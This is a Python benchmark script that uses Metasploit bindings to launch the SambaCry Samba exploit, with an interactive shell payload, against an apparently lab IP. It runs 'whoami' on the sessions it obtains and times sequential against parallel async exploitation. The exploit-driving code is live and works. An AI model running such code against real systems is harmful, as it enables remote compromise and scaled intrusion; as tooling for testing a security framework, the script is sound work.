#!/usr/bin/env python3
"""
Real benchmark with working target.
"""

import asyncio
import time
import assassinate_pyo3 as msf

TARGET_IP = "172.19.0.3"
EXPLOIT = "exploit/linux/samba/is_known_pipename"
PAYLOAD = "cmd/unix/interact"


def cleanup():
    """Kill all sessions."""
    for sid in msf.list_sessions():
        try:
            msf.kill_session(sid)
        except:
            pass
    time.sleep(0.5)


def configure(target: str):
    """Create configured module."""
    m = msf.create_module(EXPLOIT)
    m.options.RHOSTS = target
    m.options.SMB_SHARE_NAME = "myshare"
    m.options.SMB_USER = "root"
    m.options.SMB_PASS = "root"
    return m


def test_sync():
    """Test synchronous exploit."""
    print("\n" + "=" * 50)
    print("TEST: SYNC exploit()")
    print("=" * 50)

    cleanup()
    module = configure(TARGET_IP)

    print(f"[*] Running sync exploit against {TARGET_IP}...")
    start = time.time()
    session = module.exploit(PAYLOAD, timeout=60)
    elapsed = time.time() - start

    if session:
        print(f"[+] SUCCESS in {elapsed:.2f}s")
        print(f"    Session ID: {session.sid}")
        print(f"    Host: {session.host}")
        try:
            output = session.run_cmd("whoami").strip()
            print(f"    whoami: {output}")
        except Exception as e:
            print(f"    Error: {e}")
    else:
        print(f"[-] FAILED after {elapsed:.2f}s")

    return elapsed, session is not None


async def test_async():
    """Test asynchronous exploit."""
    print("\n" + "=" * 50)
    print("TEST: ASYNC exploit_async()")
    print("=" * 50)

    cleanup()
    module = configure(TARGET_IP)

    print(f"[*] Running async exploit against {TARGET_IP}...")
    start = time.time()
    session = await module.exploit_async(PAYLOAD, timeout=60)
    elapsed = time.time() - start

    if session:
        print(f"[+] SUCCESS in {elapsed:.2f}s")
        print(f"    Session ID: {session.sid}")
        print(f"    Host: {session.host}")
        try:
            output = session.run_cmd("whoami").strip()
            print(f"    whoami: {output}")
        except Exception as e:
            print(f"    Error: {e}")
    else:
        print(f"[-] FAILED after {elapsed:.2f}s")

    return elapsed, session is not None


async def test_parallel_async(n: int = 3):
    """Test N parallel async exploits against same target."""
    print("\n" + "=" * 50)
    print(f"TEST: {n}x PARALLEL exploit_async()")
    print("=" * 50)

    cleanup()

    async def run_one(idx: int):
        module = configure(TARGET_IP)
        start = time.time()
        session = await module.exploit_async(PAYLOAD, timeout=60)
        elapsed = time.time() - start
        return idx, elapsed, session

    print(f"[*] Launching {n} parallel exploits...")
    overall_start = time.time()

    tasks = [run_one(i) for i in range(n)]
    results = await asyncio.gather(*tasks)

    overall_elapsed = time.time() - overall_start

    successes = 0
    for idx, elapsed, session in results:
        status = "SUCCESS" if session else "FAILED"
        if session:
            successes += 1
        print(f"    Exploit {idx}: {status} in {elapsed:.2f}s")

    print(f"\n[*] Total time: {overall_elapsed:.2f}s for {n} exploits")
    print(f"[*] Successes: {successes}/{n}")

    return overall_elapsed, successes


def test_sequential_sync(n: int = 3):
    """Test N sequential sync exploits."""
    print("\n" + "=" * 50)
    print(f"TEST: {n}x SEQUENTIAL exploit()")
    print("=" * 50)

    cleanup()

    print(f"[*] Running {n} sequential exploits...")
    overall_start = time.time()

    successes = 0
    for i in range(n):
        module = configure(TARGET_IP)
        start = time.time()
        session = module.exploit(PAYLOAD, timeout=60)
        elapsed = time.time() - start

        status = "SUCCESS" if session else "FAILED"
        if session:
            successes += 1
        print(f"    Exploit {i}: {status} in {elapsed:.2f}s")

        # Cleanup between runs
        cleanup()

    overall_elapsed = time.time() - overall_start

    print(f"\n[*] Total time: {overall_elapsed:.2f}s for {n} exploits")
    print(f"[*] Successes: {successes}/{n}")

    return overall_elapsed, successes


def main():
    print("=" * 50)
    print("SAMBACRY BENCHMARK: Sync vs Async")
    print("=" * 50)
    print(f"Target: {TARGET_IP}")
    print(f"Exploit: {EXPLOIT}")

    msf.init_msf("/home/astark/Projects/metasploit-framework")
    print(f"MSF: {msf.framework_version()}")

    # Single target tests
    sync_time, sync_ok = test_sync()
    cleanup()

    async_time, async_ok = asyncio.run(test_async())
    cleanup()

    # Multiple exploits
    N = 3
    seq_time, seq_ok = test_sequential_sync(N)
    cleanup()

    par_time, par_ok = asyncio.run(test_parallel_async(N))
    cleanup()

    # Summary
    print("\n" + "=" * 50)
    print("BENCHMARK RESULTS")
    print("=" * 50)
    print(f"\nSINGLE TARGET:")
    print(f"  Sync:  {sync_time:.2f}s {'✓' if sync_ok else '✗'}")
    print(f"  Async: {async_time:.2f}s {'✓' if async_ok else '✗'}")

    print(f"\n{N}x EXPLOITS:")
    print(f"  Sequential (sync):  {seq_time:.2f}s ({seq_ok}/{N} success)")
    print(f"  Parallel (async):   {par_time:.2f}s ({par_ok}/{N} success)")

    if seq_time > 0 and par_time > 0:
        speedup = seq_time / par_time
        print(f"\n  SPEEDUP: {speedup:.2f}x faster with parallel async!")


if __name__ == "__main__":
    main()
